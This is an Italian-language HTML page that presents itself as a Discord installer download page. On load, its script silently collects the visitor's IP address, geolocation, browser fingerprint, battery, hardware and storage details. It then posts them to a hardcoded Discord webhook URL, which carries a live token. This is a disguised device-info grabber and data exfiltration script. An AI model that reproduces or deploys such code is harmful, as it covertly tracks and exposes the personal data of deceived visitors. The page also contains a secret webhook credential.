<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <h1>Installazione di discord sotto</h1>
    <button onclick="window.location.href='https://discord.com/api/downloads/distributions/app/installers/latest?channel=stable&platform=win&arch=x64';">
        Installazione
    </button>
</head>
<body>
    <h1>Device Information</h1>

    <script>
        async function getDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,           // Informazioni sul browser e sistema operativo
                platform: navigator.platform,             // Piattaforma del sistema operativo
                language: navigator.language,             // Lingua del browser
                cookiesEnabled: navigator.cookieEnabled,  // Stato dei cookie
                screenResolution: `${window.screen.width}x${window.screen.height}`,  // Risoluzione dello schermo
                colorDepth: window.screen.colorDepth,     // ProfonditÃ  dei colori
                online: navigator.onLine,                 // Stato della connessione
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : null,                                 // Informazioni sulla connessione di rete
                battery: null,                            // Informazioni sulla batteria (da ottenere)
                ipAddress: null,                          // Indirizzo IP (da ottenere)
                webGLRenderer: null,                      // WebGL Renderer (da ottenere)
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,  // Fuso orario
                location: null,                           // Geolocalizzazione (da ottenere)
                hardwareConcurrency: navigator.hardwareConcurrency,  // Numero di core CPU
                memory: navigator.deviceMemory || 'N/A',  // Memoria RAM (GB)
                storageEstimate: null,                    // Spazio di archiviazione disponibile (da ottenere)
                doNotTrack: navigator.doNotTrack          // Preferenza Do Not Track
            };

            // Ottieni lo stato della batteria
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                deviceInfo.battery = {
                    charging: battery.charging,
                    level: (battery.level * 100).toFixed(2) + '%',
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }

            // Ottieni l'indirizzo IP tramite un servizio esterno
            await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    deviceInfo.ipAddress = data.ip;
                });

            // Ottieni la posizione geografica
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    deviceInfo.location = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                });
            }

            // Ottieni il WebGL Renderer
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    deviceInfo.webGLRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }

            // Ottieni una stima dello spazio di archiviazione
            if (navigator.storage && navigator.storage.estimate) {
                const estimate = await navigator.storage.estimate();
                deviceInfo.storageEstimate = {
                    quota: (estimate.quota / (1024 * 1024 * 1024)).toFixed(2) + ' GB',
                    usage: (estimate.usage / (1024 * 1024 * 1024)).toFixed(2) + ' GB'
                };
            }

            // Costruisci il payload
            const payload = {
                title: "Device Information",
                details: deviceInfo
            };

            // Invia i dati al webhook (modifica l'URL con il tuo webhook o server)
            const webhookUrl = 'https://discord.com/api/webhooks/1272243742962614374/6qq-6f1Y7sXupLfshryiw4nkNMOQFHGOzWd0l0iG0p-1SzJxHd0nScxzWHTMiZ2SJ9eM';
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).then(response => {
                if (response.ok) {
                    console.log('Device information sent successfully.');
                } else {
                    console.error('Failed to send device information.');
                }
            }).catch(error => {
                console.error('Error:', error);
            });
        }

        // Esegui la funzione al caricamento della pagina
        window.onload = getDeviceInfo;
    </script>
</body>
</html>
